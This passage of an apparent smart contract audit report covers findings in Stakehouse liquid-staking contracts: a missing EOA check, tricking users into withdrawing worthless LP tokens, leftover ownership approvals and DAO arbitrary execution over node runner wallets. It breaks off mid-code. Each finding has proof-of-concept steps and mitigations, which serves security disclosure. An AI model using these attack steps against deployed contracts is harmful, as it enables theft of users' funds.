href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426</a></p>\n<p>But this check is missing during rotating EOA representative in two functions <code>rotateEOARepresentative</code> and <code>rotateEOARepresentativeOfNodeRunner</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L289</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L308</a></p>\n<p>In other words <code>_newRepresentative</code> can be a contract in these two functions without being prevented. So, this can bypass the check during registering a node runner to LSD.</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The following line should be added to functions <code>rotateEOARepresentative</code> and <code>rotateEOARepresentativeOfNodeRunner</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(!Address.isContract(_newRepresentative), &quot;Only EOA representative permitted&quot;);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/187#issuecomment-1329469080\">vince0656 (Stakehouse) confirmed duplicate issue #187</a></strong></p>\n<hr>\n<h2 id=\"m-06-withdrawing-wrong-lptoken-from-giantpool-leads-to-loss-of-funds\" style=\"position:relative;\"><a href=\"#m-06-withdrawing-wrong-lptoken-from-giantpool-leads-to-loss-of-funds\" aria-label=\"m 06 withdrawing wrong lptoken from giantpool leads to loss of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98\">[M-06] Withdrawing wrong LPToken from GiantPool leads to loss of funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98\">aphak5010</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/362\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/302\">arcoun</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/264\">wait</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/212\">unforgiven</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/171\">yixxas</a></em></p>\n<p>The <code>GiantPoolBase.withdrawLPTokens</code> function (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69</a>) allows to withdraw LP tokens from a GiantPool by burning an equal amount of GiantLP.</p>\n<p>This allows a user to handle the LP tokens directly without the need for a GiantPool as intermediary.</p>\n<p>It is not checked however whether the LP tokens to be withdrawn were transferred to the GiantPool in exchange for staking ETH.</p>\n<p>I.e. whether the LP token are of any value.</p>\n<p>There are two issues associated with this behavior.</p>\n<ol>\n<li>A malicious user can create and mint his own LP Token and send it to the GiantPool. Users that want to withdraw LP tokens from the GiantPool can then be tricked into withdrawing worthless attacker LP tokens, thereby burning their GiantLP tokens that are mapped 1:1 to ETH. (-> loss of funds)</li>\n<li>This can also mess up internal accounting logic. For every LP token that is owned by a GiantPool there should be a corresponding GiantLP token. Using the described behavior this ratio can be broken such that there are LP token owned by the GiantPool for which there is no GiantLP token. This means some LP token cannot be transferred from the GiantPool and there will always be some amount of LP token “stuck” in the GiantPool.</li>\n</ol>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>The attacker deploys his own LPToken contract and sends a huge amount of LP tokens to the GiantPool to pass the check in <code>GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP</code> (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95</a>).</li>\n<li>The attacker tricks Bob into withdrawing the malicious LP tokens from the GiantPool (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69</a>).</li>\n<li>Bob’s GiantLP tokens are burnt and he receives worthless LP tokens.</li>\n</ol>\n<p>The same issue exists for the <code>GiantSavETHVaultPool.withdrawDETH</code> function.<br>\nBut in this case, the victim must also provide a wrong savETHVault address which makes this issue less likely to be exploited.</p>\n<h3 id=\"tools-used-16\" style=\"position:relative;\"><a href=\"#tools-used-16\" aria-label=\"tools used 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The GiantPool should store information about which LP tokens it receives for staking ETH.<br>\nWhen calling the <code>GiantPoolBase.withdrawLPTokens</code> function it can then be checked if the LP tokens to be withdrawn were indeed transferred to the GiantPool in exchange for staking ETH.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-ownablesmartwallet-multiple-approvals-can-lead-to-unwanted-ownership-transfers\" style=\"position:relative;\"><a href=\"#m-07-ownablesmartwallet-multiple-approvals-can-lead-to-unwanted-ownership-transfers\" aria-label=\"m 07 ownablesmartwallet multiple approvals can lead to unwanted ownership transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99\">[M-07] OwnableSmartWallet: Multiple approvals can lead to unwanted ownership transfers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99\">aphak5010</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106</a></p>\n<p>The <code>OwnableSmartWallet</code> contract employs a mechanism for the owner to approve addresses that can then claim ownership (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94</a>) of the contract.</p>\n<p>The source code has a comment included which states that “Approval is revoked, in order to avoid unintended transfer allowance if this wallet ever returns to the previous owner” (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106</a>).</p>\n<p>This means that when ownership is transferred from User A to User B, the approvals that User A has given should be revoked.</p>\n<p>The existing code does not however revoke all approvals that User A has given. It only revokes one approval.</p>\n<p>This can lead to unwanted transfers of ownership.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>User A approves User B and User C to claim ownership</li>\n<li>User B claims ownership first</li>\n<li>Only User A’s approval for User B is revoked, not however User A’s approval for User C</li>\n<li>User B transfers ownerhsip back to User A</li>\n<li>Now User C can claim ownership even though this time User A has not approved User C</li>\n</ol>\n<h3 id=\"tools-used-17\" style=\"position:relative;\"><a href=\"#tools-used-17\" aria-label=\"tools used 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You should invalidate all approvals User A has given when another User becomes the owner of the OwnableSmartWallet.</p>\n<p>Unfortunately you cannot use a statement like <code>delete _isTransferApproved[owner()]</code>.</p>\n<p>So you would need an array that keeps track of approvals as pointed out in this StackExchange question: <a href=\"https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping\">https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99#issuecomment-1329517472\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-08-dao-admin-in-liquidstakingmanagersol-can-rug-the-registered-node-operator-by-stealing-their-fund-in-the-smart-wallet-via-arbitrary-execution\" style=\"position:relative;\"><a href=\"#m-08-dao-admin-in-liquidstakingmanagersol-can-rug-the-registered-node-operator-by-stealing-their-fund-in-the-smart-wallet-via-arbitrary-execution\" aria-label=\"m 08 dao admin in liquidstakingmanagersol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106\">[M-08] DAO admin in <code>LiquidStakingManager.sol</code> can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/449\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/411\">Trust</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/48\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63</a></p>\n<p>DAO admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>After the Liquid Staking Manager.so is deployed via <code>LSDNFactory::deployNewLiquidStakingDerivativeNetwork</code>,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Deploys a new LSDN and the liquid staking manger required to manage the network</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _dao Address of the entity that will govern the liquid staking network</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployNewLiquidStakingDerivativeNetwork</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dao</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_optionalCommission</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deployOptionalHouseGatekeeper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_stakehouseTicker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>The DAO address governance address (contract) has very high privilege.</p>\n<p>The DAO address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Enable operations proxied through DAO contract to another contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _nodeRunner Address of the node runner that created the wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _to Address of the target contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _data Encoded data of the function call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _value Total value attached to the transaction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeAsSmartWallet</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No wallet found&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">_data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">_value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>When a register a new node operator with 4 ETH by calling registerBLSPublicKeys:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice register a node runner to LSD by creating a new smart wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _blsPublicKeys list of BLS public keys</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _blsSignatures list of BLS signatures</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _eoaRepresentative EOA representative of wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">registerBLSPublicKeys</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span 